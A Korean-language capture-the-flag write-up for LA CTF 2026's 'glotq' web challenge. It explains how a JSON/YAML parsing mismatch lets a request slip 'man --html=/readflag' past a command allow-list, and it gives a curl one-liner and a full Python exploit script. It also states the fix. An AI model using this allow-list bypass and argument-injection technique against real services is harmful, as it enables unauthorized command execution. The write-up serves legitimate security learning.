# glotq (LA CTF 2026)

---

- **Name:** glotq
- **Category:** Web
- **Connection:** `https://glotq-xxx.instancer.lac.tf`
- **Flag format:** `lactf{...}`

---

### 개요

서버에서 `jq`, `yq`, `xq`, `man` 명령어를 실행해주는 서비스입니다.
플래그는 `/flag.txt`에 있는데, root 소유라 직접 읽을 수 없습니다.
대신 `/readflag`라는 SUID 바이너리가 있어서, 이걸 실행하면 플래그를 읽어줍니다.

엔드포인트 구성은 이렇습니다.

| 엔드포인트 | 설명 |
|---|---|
| `POST /json` | jq 또는 yq 실행 |
| `POST /yaml` | yq 실행 |
| `POST /xml` | xq 실행 |

얼핏 보면 "허용된 명령어만 실행하니까 안전하다"는 구조입니다.
진짜 문제는 **검증하는 파서와 실행하는 파서가 다르다**는 것입니다.

---

### 소스 분석

#### SecurityMiddleware — 검증 단계

모든 요청은 핸들러에 도달하기 전에 `SecurityMiddleware`를 거칩니다.

```go
// Content-Type을 보고 파서를 선택해 command/args를 검증합니다
func SecurityMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        var req Request
        body, _ := io.ReadAll(r.Body)

        switch r.Header.Get("Content-Type") {
        case "application/json":
            json.Unmarshal(body, &req)
        case "application/x-yaml":
            yaml.Unmarshal(body, &req)
        // ...
        }

        if !isAllowed(req.Command) {  // 허용 목록 검사
            http.Error(w, "Command not allowed", 403)
            return
        }

        // 검증 통과 후 원본 body를 그대로 넘김
        r.Body = io.NopCloser(bytes.NewReader(body))
        next.ServeHTTP(w, r)
    })
}
```

미들웨어는 `Content-Type`에 따라 파서를 골라 `Command`를 검증합니다.
그리고 **원본 raw body를 그대로 핸들러로 넘깁니다.**

#### /yaml 핸들러 — 실행 단계

```go
func yamlHandler(w http.ResponseWriter, r *http.Request) {
    var req Request
    body, _ := io.ReadAll(r.Body)

    yaml.Unmarshal(body, &req)  // ← 무조건 YAML 파서로 다시 파싱!

    exec.Command(req.Command, req.Args...).Output()
}
```

핸들러는 `Content-Type`을 신경 쓰지 않고, **항상 YAML 파서로 body를 다시 파싱**합니다.

여기서 문제가 생깁니다.

미들웨어는 `Content-Type: application/json`이면 JSON으로 파싱하고,
핸들러는 `/yaml` 엔드포인트니까 무조건 YAML로 파싱합니다.

즉, `/yaml`에 `Content-Type: application/json`을 보내면,
**같은 body가 미들웨어에서는 JSON으로, 핸들러에서는 YAML으로 파싱됩니다.**

---

### 핵심: JSON과 YAML이 같은 body를 다르게 읽는다

Go의 `encoding/json`은 struct 필드를 **대소문자 구분 없이** 매핑합니다.
같은 필드가 여러 번 등장하면 **마지막 값이 이깁니다.**

Go의 YAML 라이브러리는 struct의 `yaml:` 태그를 기준으로 매핑합니다.
태그는 소문자이므로, `"command"`는 매핑되지만 `"Command"`는 **무시됩니다.**

```go
type Request struct {
    Command string   `json:"command" yaml:"command"`
    Args    []string `json:"args"    yaml:"args"`
}
```

이 구조체에 아래 JSON body를 던지면:

```json
{
  "command": "man",
  "args": ["--html=/readflag", "jq"],
  "Command": "yq",
  "Args": ["."]
}
```

| 파서 | `command` 값 | `args` 값 |
|------|-------------|-----------|
| JSON (미들웨어) | `"yq"` (마지막 `"Command"`가 덮어씀) | `["."]` |
| YAML (핸들러) | `"man"` (소문자 `"command"`만 읽음) | `["--html=/readflag","jq"]` |

미들웨어는 `yq`로 보고 허용 목록을 통과시키고,
핸들러는 `man`으로 읽어서 실행합니다.

---

### man --html=/readflag 가 왜 되는가

`man` 명령어에는 `--html=<browser>` 옵션이 있습니다.
HTML 형식으로 출력할 때 렌더링할 "브라우저" 프로그램을 지정하는 옵션인데,
여기 적은 경로가 **그대로 실행됩니다.**

`/readflag`는 SUID root 바이너리이므로, 이걸 브라우저로 지정하면 root 권한으로 실행되어 `/flag.txt`를 읽어줍니다.

```
man --html=/readflag jq
→ /readflag 실행 (SUID root)
→ /flag.txt 내용 출력
```

**단 하나의 요청으로 플래그를 읽습니다.**

```bash
curl -sS -X POST "https://glotq-xxx.instancer.lac.tf/yaml" \
  -H "Content-Type: application/json" \
  --data-binary '{"command":"man","args":["--html=/readflag","jq"],"Command":"yq","Args":["."]}'
```

요청 흐름을 정리하면:

```

3. yamlHandler: YAML 파싱 → command="man", args=["--html=/readflag","jq"]
4. exec("man", "--html=/readflag", "jq") 실행
5. /readflag (SUID) 실행 → /flag.txt 읽기
6. 응답에 플래그 포함
```

### Exploit 코드 (Python)

```python
#!/usr/bin/env python3
import argparse, json, re, sys, requests

FLAG_RE = re.compile(r"lactf\{[^}]+\}")

def solve(base: str, timeout: float = 10.0) -> str:
    url = base.rstrip("/") + "/yaml"

    # 같은 body를 JSON은 Command="yq"로, YAML은 command="man"으로 읽습니다
    payload = {
        "command": "man",
        "args": ["--html=/readflag", "jq"],
        "Command": "yq",   # JSON 파서(미들웨어)가 마지막 값으로 읽음
        "Args": ["."],
    }

    r = requests.post(
        url,
        headers={"Content-Type": "application/json"},
        data=json.dumps(payload),
        timeout=timeout,
    )
    r.raise_for_status()

    try:
        j = r.json()
        text = (j.get("output") or "") + "\n" + (j.get("error") or "")
    except Exception:
        text = r.text

    m = FLAG_RE.search(text)
    if not m:
        raise RuntimeError(f"플래그를 찾지 못했습니다:\n{text[:300]}")
    return m.group(0)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="예: https://glotq-xxx.instancer.lac.tf")
    ap.add_argument("--timeout", type=float, default=10.0)
    args = ap.parse_args()
    try:
        print(solve(args.base, args.timeout))
    except Exception as e:
        sys.exit(f"[!] {e}")

if __name__ == "__main__":
    main()
```

**실행 방법:**

```bash
python3 solve.py --base "https://glotq-xxx.instancer.lac.tf"
```

### 요약

이 문제의 핵심은 **Parsing Desync(파싱 불일치)** 입니다.

검증(미들웨어)과 실행(핸들러)이 같은 raw body를 **서로 다른 파서로 읽습니다.**
JSON과 YAML은 대소문자 처리 방식이 달라서, 하나의 body가 각 파서에게 다른 내용으로 보입니다.

이 간극을 이용해 미들웨어를 `yq`로 속이고, 핸들러에서는 `man`을 실행합니다.
`man --html=<경로>`의 임의 실행 기능과 `/readflag` SUID 바이너리를 조합하면 플래그까지 도달합니다.

수정 방법은 간단합니다. body를 **한 번만 파싱**해서 파싱된 구조체를 미들웨어와 핸들러가 공유하면 됩니다. raw body를 두 번 파싱하는 구조 자체가 문제입니다.
